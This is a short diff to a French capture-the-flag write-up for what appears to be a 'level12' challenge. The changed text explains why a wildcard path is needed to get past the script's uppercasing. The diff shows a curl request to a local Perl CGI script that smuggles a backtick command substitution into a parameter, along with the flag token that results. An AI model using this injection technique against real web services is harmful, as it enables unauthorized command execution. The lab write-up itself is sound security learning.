@@ -19,4 +19,4 @@ $ chmod 777 /tmp/GETFLAG
 $ curl localhost:4646/level12.pl?x='`/*/GETFLAG`'
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
-Obligé de mettre le `/*/` pour eviter de devoir taper `/tmp/` qui va se transformer en `/TMP/` ce qui n'existe pas.
+On est malheureusement obligé de mettre le `/*/` pour compléter le path sans mettre de minuscule (`/tmp/` va se transformer en `/TMP/` ce qui n'existe pas.)
